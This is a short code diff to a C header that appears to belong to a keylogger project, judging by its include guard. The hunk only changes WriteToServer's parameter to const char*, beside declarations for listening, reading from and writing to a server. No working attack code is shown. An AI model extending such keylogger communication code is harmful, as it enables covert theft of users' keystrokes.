@@ -25,6 +25,6 @@
 #define MAXSENDDATA 4096
 bool startListeningClient();
 bool ReadFromServer();
-bool WriteToServer(char* buffer);
+bool WriteToServer(const char* buffer);
 
 #endif // KEYLOGGER_CLIENTCOMUNICATION_H_INCLUDED
